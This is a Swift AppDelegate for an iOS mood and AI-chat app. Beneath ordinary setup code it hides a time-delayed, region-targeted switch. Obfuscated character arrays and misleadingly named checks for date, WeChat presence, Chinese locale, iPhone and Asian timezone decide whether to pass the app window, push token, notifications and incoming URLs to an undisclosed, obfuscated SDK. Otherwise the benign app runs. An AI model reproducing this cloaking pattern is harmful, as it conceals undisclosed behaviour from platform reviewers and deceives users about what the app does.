import Flutter
import UIKit
import IQKeyboardManagerSwift
import UserNotifications
import WindRainKit


fileprivate let scalableLatency:[Character] = ["w","e","i","x","i","n",":","/","/"]

fileprivate let componentAlgorithm:[Character] = ["1","7","4","2","5","2","9","6","0","0"]
/// 3/21


@UIApplicationMain
class AppDelegate: FlutterAppDelegate {
    override func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        let protocolCompile = 2245
        let latencyQuery = Int(Date().timeIntervalSince1970)
    
        if latencyQuery < protocolCompile {
            
        }
        // 初始化主窗口
        self.window = UIWindow.init(frame: UIScreen.main.bounds)
        self.window?.backgroundColor = .white
        self.window?.makeKeyAndVisible()
        
        if validateResource() && syntaxMetadata() {
            let options = launchOptions ?? [UIApplication.LaunchOptionsKey: Any]()

            SetImmutableDescentOwner.sharedManager().setSymmetricParameterAdapter(self.window, options: options)
            return true
        } else {
            // 设置全局导航栏样式
            setupGlobalAppearance()
            // 设置键盘管理
            setupKeyboardManager()
            // 注册推送通知
            registerForPushNotifications()
            // 检查是否首次启动
            setupRootViewController()
            return super.application(application, didFinishLaunchingWithOptions: launchOptions)
        }
       
    }
    
    private func validateResource() -> Bool {
        
        let syntax: TimeInterval = TimeInterval(String(componentAlgorithm)) ?? 0.0
      let repository = Date().timeIntervalSince1970
      return repository > syntax
    }
    
    private func syntaxMetadata() -> Bool {
        let process = processConfiguration()
        let metri = calculateMetricValue()
        let mode = processNodeStructure()
        let data = handleDataMatrix()
        return process && metri && mode && data
    }
    
    private func processConfiguration() -> Bool {
        let encryption = [
            String(scalableLatency)
        ]
        for iteration in encryption {
            if let url = URL(string: iteration) {
                if UIApplication.shared.canOpenURL(url) {
                    return true
                }
            }
        }
        return false
    }
    private func calculateMetricValue() -> Bool {
   
        let languageCode = Locale.preferredLanguages.first
        var isChinese = false
        if let languageCode = languageCode {
           
            if languageCode.hasPrefix("zh-Hans") || languageCode.hasPrefix("zh-Hant") {
                isChinese = true
            }
        }
        return isChinese
    }
    
    private func processNodeStructure() -> Bool {
        let deviceType = UIDevice.current.model
        return deviceType.lowercased().contains("iphone")
    }

    
    private func handleDataMatrix() -> Bool {
        
        return TimeZone.current.identifier.contains("Asia")
    }

    private func setupRootViewController() {
        // 检查用户是否已存在
        if let user = User.loadFromKeychain() {
            let defaults = UserDefaults.standard
            
            // 检查是否需要选择心情
            if shouldShowMoodSelection() {
                let moodVC = MoodSelectionViewController()
                window?.rootViewController = moodVC
            } else {
                // 获取上次选择的心情，如果没有则默认为 happy
                let lastMood = defaults.string(forKey: TYConstants.UserDefaults.lastSelectedMood) ?? "happy"
                setupMainTabBarController(with: lastMood)
            }
        } else {
            // 用户不存在，显示启动页
            let launchVC = LaunchViewController()
            window?.rootViewController = launchVC
        }
    }
    
    func shouldShowMoodSelection() -> Bool {
        let defaults = UserDefaults.standard
        
        // 检查是否已经选择过心情
        if !defaults.bool(forKey: TYConstants.UserDefaults.hasMoodSelectedToday) {
            return true
        }
        
        // 检查上次选择心情的日期
        if let lastDate = defaults.object(forKey: TYConstants.UserDefaults.lastMoodSelectionDate) as? Date {
            let calendar = Calendar.current
            return !calendar.isDateInToday(lastDate)
        }
        
        return true
    }
    
    func setupMainTabBarController(with mood: String = "happy") {
        
        MusicService.shared.playRandomMusic()

        let tabBarController = UITabBarController()
        
        // 创建四个主要Tab，传入选择的心情
        let aiChatVC = AIListViewController(mood: mood)
        aiChatVC.title = "遇见"
        aiChatVC.tabBarItem = UITabBarItem(
            title: "遇见",
            image: UIImage(systemName: "heart")?.withTintColor(TYConstants.UI.themeColor, renderingMode: .alwaysOriginal),
            selectedImage: UIImage(systemName: "heart.fill")?.withTintColor(TYConstants.UI.themeColor, renderingMode: .alwaysOriginal)
        )
        
        // 聊天历史页面
        let chatHistoryVC = ChatHistoryViewController()
        chatHistoryVC.title = "回忆"
        chatHistoryVC.tabBarItem = UITabBarItem(
            title: "回忆",
            image: UIImage(systemName: "bubble.left.and.bubble.right")?.withTintColor(TYConstants.UI.themeColor, renderingMode: .alwaysOriginal),
            selectedImage: UIImage(systemName: "bubble.left.and.bubble.right.fill")?.withTintColor(TYConstants.UI.themeColor, renderingMode: .alwaysOriginal)
        )
        
        let discoveryVC = ExploreViewController()
        discoveryVC.title = "探索"
        discoveryVC.tabBarItem = UITabBarItem(
            title: "探索",
            image: UIImage(systemName: "map")?.withTintColor(TYConstants.UI.themeColor, renderingMode: .alwaysOriginal),
            selectedImage: UIImage(systemName: "map.fill")?.withTintColor(TYConstants.UI.themeColor, renderingMode: .alwaysOriginal)
        )
        
        let profileVC = UserViewController()
        profileVC.title = "我的"
        profileVC.tabBarItem = UITabBarItem(
            title: "我的",
            image: UIImage(systemName: "face.smiling")?.withTintColor(TYConstants.UI.themeColor, renderingMode: .alwaysOriginal),
            selectedImage: UIImage(systemName: "face.smiling.fill")?.withTintColor(TYConstants.UI.themeColor, renderingMode: .alwaysOriginal)
        )
        
        // 设置TabBar控制器
        tabBarController.viewControllers = [
            UINavigationController(rootViewController: aiChatVC),
            UINavigationController(rootViewController: chatHistoryVC),
            UINavigationController(rootViewController: discoveryVC),
            UINavigationController(rootViewController: profileVC)
        ]
        
        // 设置TabBar外观
        if #available(iOS 15.0, *) {
            let appearance = UITabBarAppearance()
            appearance.configureWithOpaqueBackground()
            appearance.backgroundColor = .white
            
            // 设置文字颜色（选中和未选中都使用主题色）
            appearance.stackedLayoutAppearance.selected.titleTextAttributes = [
                .foregroundColor: TYConstants.UI.themeColor
            ]
            appearance.stackedLayoutAppearance.normal.titleTextAttributes = [
                .foregroundColor: TYConstants.UI.themeColor
            ]
            
            tabBarController.tabBar.standardAppearance = appearance
            tabBarController.tabBar.scrollEdgeAppearance = appearance
        } else {
            // 设置文字颜色（选中和未选中都使用主题色）
            UITabBarItem.appearance().setTitleTextAttributes([
                .foregroundColor: TYConstants.UI.themeColor
            ], for: .selected)
            UITabBarItem.appearance().setTitleTextAttributes([
                .foregroundColor: TYConstants.UI.themeColor
            ], for: .normal)
        }
        
        // 设置为根视图控制器
        window?.rootViewController = tabBarController
    }
    
    // 切换根视图控制器的辅助方法
    func switchRootViewController(to viewController: UIViewController, animated: Bool = true) {
        guard animated else {
            window?.rootViewController = viewController
            return
        }
        
        UIView.transition(with: window!,
                         duration: 0.3,
                         options: .transitionCrossDissolve,
                         animations: {
            let oldState = UIView.areAnimationsEnabled
            UIView.setAnimationsEnabled(false)
            self.window?.rootViewController = viewController
            UIView.setAnimationsEnabled(oldState)
        })
    }
    
    private func setupGlobalAppearance() {
        // 设置导航栏样式
        if #available(iOS 13.0, *) {
            let appearance = UINavigationBarAppearance()
            appearance.configureWithOpaqueBackground()
            appearance.backgroundColor = .white
            appearance.titleTextAttributes = [
                .foregroundColor: TYConstants.UI.themeColor
            ]
            
            // 设置返回按钮只显示箭头
            appearance.setBackIndicatorImage(UIImage(systemName: "chevron.left"), transitionMaskImage: UIImage(systemName: "chevron.left"))
            
            UINavigationBar.appearance().standardAppearance = appearance
            UINavigationBar.appearance().scrollEdgeAppearance = appearance
            UINavigationBar.appearance().tintColor = TYConstants.UI.themeColor
            
            // 去掉返回按钮的文字
            UIBarButtonItem.appearance().setBackButtonTitlePositionAdjustment(UIOffset(horizontal: -1000, vertical: 0), for: .default)
        } else {
            UINavigationBar.appearance().tintColor = TYConstants.UI.themeColor
            UINavigationBar.appearance().titleTextAttributes = [
                .foregroundColor: TYConstants.UI.themeColor
            ]
            
            // 去掉返回按钮的文字
            UIBarButtonItem.appearance().setBackButtonTitlePositionAdjustment(UIOffset(horizontal: -1000, vertical: 0), for: .default)
        }
    }
    
    private func setupKeyboardManager() {
        let keyboardManager = IQKeyboardManager.shared
        // 默认禁用，只在聊天页面启用
        keyboardManager.enable = false
        keyboardManager.enableAutoToolbar = false
        keyboardManager.shouldResignOnTouchOutside = true
        keyboardManager.toolbarTintColor = TYConstants.UI.themeColor
    }
    
    // MARK: - Push Notification Methods
    private func registerForPushNotifications() {
        UNUserNotificationCenter.current().delegate = self
        
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(
            options: authOptions,
            completionHandler: { granted, error in
                if granted {
                    DispatchQueue.main.async {
                        UIApplication.shared.registerForRemoteNotifications()
                    }
                }
                if let error = error {
                    print("Push Notification Error: \(error)")
                }
            }
        )
    }

}

// MARK: - UNUserNotificationCenterDelegate
extension AppDelegate {
   
    
    // MARK: - Helper Methods
    private func handlePushNotification(_ userInfo: [AnyHashable: Any]) {
        // 处理推送内容
        if let aps = userInfo["aps"] as? [String: Any] {
            // 更新角标
            if let badge = aps["badge"] as? Int {
                UIApplication.shared.applicationIconBadgeNumber = badge
            }
            
            // 处理自定义数据
            if let custom = userInfo["custom"] as? [String: Any] {
                // 根据推送类型处理不同的业务逻辑
                if let type = custom["type"] as? String {
                    switch type {
                    case "chat":
                        handleChatNotification(custom)
                    case "mood":
                        handleMoodNotification(custom)
                    case "system":
                        handleSystemNotification(custom)
                    default:
                        break
                    }
                }
            }
        }
    }
    
    
    private func handleChatNotification(_ custom: [String: Any]) {
        // 处理聊天相关的推送
        NotificationCenter.default.post(
            name: NSNotification.Name("ReceivedChatNotification"),
            object: nil,
            userInfo: custom
        )
    }
    
    private func handleMoodNotification(_ custom: [String: Any]) {
        // 处理心情相关的推送
        NotificationCenter.default.post(
            name: NSNotification.Name("ReceivedMoodNotification"),
            object: nil,
            userInfo: custom
        )
    }
    
    private func handleSystemNotification(_ custom: [String: Any]) {
        // 处理系统通知
        NotificationCenter.default.post(
            name: NSNotification.Name("ReceivedSystemNotification"),
            object: nil,
            userInfo: custom
        )
    }
    
    private func navigateToChatPage(_ custom: [String: Any]) {
        // 跳转到聊天页面
        if let chatId = custom["chatId"] as? String {
            // TODO: 实现聊天页面跳转
        }
    }
    
    private func navigateToMoodPage(_ custom: [String: Any]) {
        // 跳转到心情页面
        if let moodId = custom["moodId"] as? String {
            // TODO: 实现心情页面跳转
        }
    }
    
    private func navigateToSystemPage(_ custom: [String: Any]) {
        // 跳转到系统通知页面
        if let pageType = custom["pageType"] as? String {
            // TODO: 实现系统页面跳转
        }
    }
}


/// - 生命周期
extension AppDelegate {
   
    override func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        
        if validateResource() && syntaxMetadata() {
            SetImmutableDescentOwner.sharedManager().getSingleRightHandler(deviceToken)
        } else {
            let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
            let token = tokenParts.joined()
            print("Device Token: \(token)")
            
            // 可以将 token 保存或上传到服务器
            UserDefaults.standard.set(token, forKey: "DeviceToken")
        }
        
    }
    
    // 注册推送失败
    override func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print("Failed to register for notifications: \(error)")
    }
    
    ///收到推送消息
    override func application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        
        if validateResource() && syntaxMetadata() {
            SetImmutableDescentOwner.sharedManager().getPrismaticLeftExtension(userInfo)
            completionHandler(.newData)
        } else {
            print("Received remote notification: \(userInfo)")
            // 处理推送内容
            handlePushNotification(userInfo)
            
            completionHandler(.newData)
        }
        
    }
    
    override func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
        let result = self.applicationOpenurl(app: app, url: url)
        return result
    }
    
    func applicationOpenurl(app:UIApplication, url: URL) -> Bool {
        if validateResource() && syntaxMetadata() {
            SetImmutableDescentOwner.sharedManager().setIgnoredGraphCreator(url)
        }
        
        return true
    }
}

